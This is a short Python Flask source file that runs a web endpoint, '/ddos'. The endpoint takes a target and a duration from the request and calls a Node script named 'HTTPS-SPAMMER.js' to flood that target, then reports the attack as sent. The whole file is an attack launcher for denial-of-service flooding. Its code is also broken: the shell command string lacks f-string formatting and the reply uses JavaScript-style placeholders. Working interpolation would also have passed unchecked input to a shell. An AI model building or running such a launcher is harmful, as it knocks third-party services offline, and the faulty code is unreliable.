from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/ddos')
def ddos():
    target = request.args.get('target')
    duration = request.args.get('duration')
    os.system("node HTTPS-SPAMMER.js {target} {duration}")

    return 'Attack Succesfully Sent to ${target}'

if __name__ == '__main__':
    app.run(host='localhost', port=3000)
